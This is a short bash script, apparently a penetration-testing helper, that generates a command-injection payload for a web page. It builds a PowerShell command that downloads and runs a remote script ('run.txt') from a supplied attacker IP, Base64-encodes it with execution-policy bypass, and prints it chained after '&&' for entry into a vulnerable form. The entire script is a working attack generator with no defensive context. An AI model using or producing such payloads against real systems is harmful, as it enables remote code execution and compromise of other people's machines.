#!/bin/bash

# Check if IP address is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <YOUR_IP>"
    echo "Example: $0 192.168.45.1"
    exit 1
fi

IP="$1"

# The PowerShell command template
PS_COMMAND="(New-Object System.Net.WebClient).DownloadString('http://$IP/run.txt') | IEX"

# Convert to UTF-16LE and Base64 encode
ENCODED=$(echo -n "$PS_COMMAND" | iconv -t UTF-16LE | base64 -w 0)

# Output the web page entry format
echo "Enter this into the web page:"
echo "$IP && powershell -ep bypass -enc $ENCODED"
echo
echo "Full command breakdown:"
echo "powershell -ep bypass -enc $ENCODED"
